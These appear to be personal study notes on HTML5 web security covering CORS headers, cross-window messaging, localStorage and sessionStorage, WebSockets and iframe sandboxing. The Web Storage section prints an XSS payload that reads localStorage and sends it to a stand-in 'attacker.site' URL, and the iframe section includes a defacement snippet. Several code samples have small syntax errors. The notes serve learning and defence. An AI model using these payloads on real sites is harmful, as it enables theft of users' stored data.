1. Cross Origin Resource Sharing (CORS)
- same origin policy (SOP) : is a policy implemented by browsers to prevent interactions between resources of different origin.
- CSS stylesheets, images and scripts are loaded without checking the SOP
- Browsers check the SOP when performing AJAX requests
- Within the Flash security model, a method to bypass the same origin policy has already been developed.
- An SWF animation on the origin a.com can access via Actionscript resources such as images and audio files on a different origin, b.com. This can happen only if the crossdomain.xml file allows this operation.
	![[Pasted image 20220408082124.png]]
- `CORS` : It enables client-side cross-origin requests. by HTTP Header Called `Control Access Headers
- The CORS standard is used to enable cross-origin HTTP requests for:
	1. Ajax requests (through the XMLHttpRequest API),`In our examples`
	2. Web Fonts (for cross-domain font inclusion via @font-face within a CSS)
	3. WebGL textures
	4. Images drawn using the drawImage API
- Cross Origin Ajax Request : `http://origina.ori/index.html`
```
function crossOriginXHRGet(){
var xmlhttpr = new XMLHttpRequest();
var url = 'http://originb.ori/page.html';
 xmlhttpr.open('GET', url, true);
 xmlhttpr.onreadystatechange = handler;
 xmlhttpr.send(body); 
}
```
- Request type
	1. Simple requests : It only uses GET, HEAD or POST HTTP methods,If the request method is POST, the Content-Type HTTP header must be one of the following:
		- application/x-www-form-urlencoded
		- multipart/form-data
		- text/plain
	2. Preflight request : when it is not a Simple request
		- A PUT request
		- A POST request with Content-type set to application/xml
		- A GET request with a custom header such as X-PINGOTHER
		- need to send two HTTP requests : The first request is an HTTP OPTIONS
		- HTTP Origin : called control access headers
		- By the use of the HTTP response header Access-Control-Max-Age, the browser will cache the result of the OPTIONS request.
		- Request by AJAX
	```
	var xmlhttpr = new XMLHttpRequest();
	var url = 'http:// originb.ori/file.html';
	function handler(){
	. . . . 
	}
	function deleteResource(){
	 xmlhttpr.open('DELETE', url, true);
	 xmlhttpr.setRequestHeader('Front-End-Https', on');
	 xmlhttpr.onreadystatechange = handler;
	 xmlhttpr.send(body); 
	}
	_____________________________

	Browser Request 
	Origin: http://origina.ori 
	Access-Control-Request-Method: DELETE
	Access-Control-Request-Headers: Front-End-Https

	___________________________________
	Server Respons

	Access-Control-Allow-Origin: http://origina.ori
	Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE
	Access-Control-Allow-Headers: Front-End-Https
	Access-Control-Max-Age: 3600
	```

3.   Request credentials
```
	<script type="text/javascript">
	function handler() {
	. . . 
	}
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "http://originb.com/home.html", true);
	xhr.withCredentials = true; ###################################
	xhr.onreadystatechange = handler;
	xhr.send();
	</script>
	
```

- Access control headers 
1. Access-Control-Allow Origin : `<domains>` or *  -->  access specific requester origin.
2. Access-Control-Allow-Credentials : True --> Request can be made with credentials
3. Access-Control-Allow-Headers  : ![[Pasted image 20220408085449.png]]
4. Access-Control-Allow-Methods : ![[Pasted image 20220408085527.png]]
5. Access-Control-Max-Age : ![[Pasted image 20220408085615.png]]
6. Access-Control-Expose-Headers : sent by the target origin to the requester indicates which headers can be accessed by the browser. 
	`Access-Control-Expose-Headers: [<MyHeader1>][<MyHeader2>][*]`
7. Origin : contains (protocol, domain name and port)
8. Access-Control-Request-Method : ![[Pasted image 20220408085903.png]]
9. Access-Control-Request-Header : ![[Pasted image 20220408085946.png]]
	
- For security reasons will never be sent together : 
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

***
2. Cross Windows Messaging
- HTML5 allows iframes, frames, popups to communicate one with each other regardless of SOP
- Relationships between Windows
	1. A main window including an iframe
	2. A main window including some HTML code that generates a popup
- A window can send messages to another window by using the postMessage API call.
```
<button onclick="openPopup()">Open</button>
<button onclick="sendCustomMessage()">Send</button>
<script>
 	function openPopup() {
 	popup = open("http://target.site/to.php");
 	}
 	function sendCustomMessage() {
 		popup.postMessage("Hi there!", "http://victim.site/to.php");
 	}
</script>
```
- The following code accepts messages from every source!
```
<script>
window.addEventListener("message", receiveMessage, false);
function receiveMessage(event) {
	console.log("Message received")
 	// Do some actions
	// . . . 
}
</script>
```
- The attacker has just to exploit an XSS vulnerability in the source domain and build some JavaScript code to send a malicious message.
***
3. Web Storage
- HTML5 allows websites to store data locally in the browser.
- This is done by accessing the localStorage and the sessionStorage objects via JavaScript.
- Mistakenly lead us to associate this type of storage with cookies.
- `Size`: **cookie** size is limited to 4KB, while **localStorage** size ranges from 5MB to 10MB (depending on the browser implementation)
- `Interface`: **cookies** are accessed by client/server and transferred over HTTP connections **localStorage** is known only to the browser
-`Data model`: **cookies** represent a complex structure, while **web storage** provides a simpler interface by using an associative array data model.


- HTML5 distinguishes two different storage models: local storage and session storage
	- Session storage is less persistent than local storage.
- local storage
	-   HTML pages loaded by the browser and sharing the same origin will use the same local storage object
	-  This storage is persistent and will be deleted when one of the following events occur :
		-  The web application deletes storage through localStorage API calls
		-  The user deletes storage using the browser cleaning feature, For example through the Clear Recent History feature
	- Local Storage API
		- You can add an item to the localStorage
			- `localStorage.setItem('username','jsmith');` 
		- To retrieve an item from the localStorage
			- `var usrname = localStorage.getItem('username'); console.log(usrname);` 
		- Remove an item from the localStorage
			- `localStorage.removeItem('username'); console.log(localStorage.getItem('username'));`
		- clear the localStorage
			- `localStorage.clear()`

-  Session storage
	-  is bound to the browser window where a website is open.
	-  If a browser has ten tabs pointing to the same URL: each of them will have its own sessionStorage
	-  This storage is deleted when one of the following events occurs :
		-  The web application deletes storage through sessionStorage API calls
		-  The user deletes storage through the browser cleaning feature
		-  The user closes the browser window
		-  Note that when a user refreshes the browser page, the sessionStorage object is kept
	-  Session Storage API
		-  setItem
		-  getItem
		-  removeItem
		-  Clear
- Security Issues
	- both localStorage and sessionStorage are managed via JavaScript, they can be stolen through XSS attacks. 
	- This script cycles through the storage and then submits it to an attacker controlled site:
```
		<script>
var i = 0;
var stor = "";
var img = new Image();
while (localStorage.key(i) != null)
{
 var key = localStorage.key(i); 
 stor += key + ": " + localStorage.getItem(key)) + "\n";
 i++;
}
img.src="http://attacker.site?steal.php?storage=" + stor;
</script>
```

4. WebSockets
- The WebSocket protocol features:
	1. Connection established by upgrading an existing HTTP connection to WebSocket
	2. Supported by browsers --> ws://, wss:// "secure"
	3. HTTP standard ports 80,443, This means: no firewall issues for the users
	4. Full-duplex-->The protocol allow communication in both directions simultaneously
- To connect to a WebSocket server : 
    `var ws = new WebSocket('ws://<WebSocketServerURL>');`
- To receive notifications about the opened connection use the onopen event listener:
```
ws.onopen = function(e) {
alert("Connection established");
// send a message
this.send('<your message>');
}
```
- To receive notifications about new messages use the onmessage event listener:
```
ws.onmessage = function(e) {
alert("Received message");
// read the message
var msg= e.data;
alert(msg);
}
```

- Security Issues
- If developers do not sanitize lead to XSS, localStorage stealing, SQL injections and more
***
5. Sandboxed frames
1. Redirection
	- A classic issue occurs when a website hosts third-party contents through iframes.
	- `location` is an exception to the SOP
	- An iframe could redirect visitors to an arbitrary website by simply setting the location property of its parent document.
	- Example : If a web page (index.html) includes an attacker controlled page (evil.html) in an iframe, the attacker can change the window.location and redirect users to an attacker controlled site (http://attacker.site/). : 
	![[Pasted image 20220408105700.png]]

	- The previous attack is possible because:
		- The target website hosts the attackers iframe
		- The target website does not prevent an attacker from changing the location property
		
	- Preventing
		- Old School
			- Installing a special event (onbeforeunload) in the main document hosting the iframes.
			![[Pasted image 20220408105928.png]]

- If the main document and the iframe are located on the same origin, they can access each other.
`<script> window.parent.document.body.innerHTML = 'defaced'; </script>`


- For example in a scenario where: 
	- the attacker succeeds in exploiting a persistent XSS in the vulnerable.html page
	-  the vulnerable.html page is included through an iframe into the index.hmtl page
	![[Pasted image 20220408110253.png]]
	
	- To understand the attack, consider that:
		- The index.html page includes the page vulnerable.html through an iframe.
		- The JavaScript code on the iframe can access the parent document (index.html) because of the same origin policy therefore, the iframe can change the main document’s contents.
	- The `sandbox` attribute is a new attribute of the element iframe . It has been introduced by the HTML5 specs, and enables restrictions on iframe contents.
	![[Pasted image 20220408110514.png]]
	
- default, the sandbox attribute denies all
	- ALLOW-SCRIPT : This flag allows script execution
	- ALLOW-FORMS : This flag allows form submission
	- ALLOW-TOP-NAVIGATION : This flag allows the iframe content to navigate its top-level browsing context.
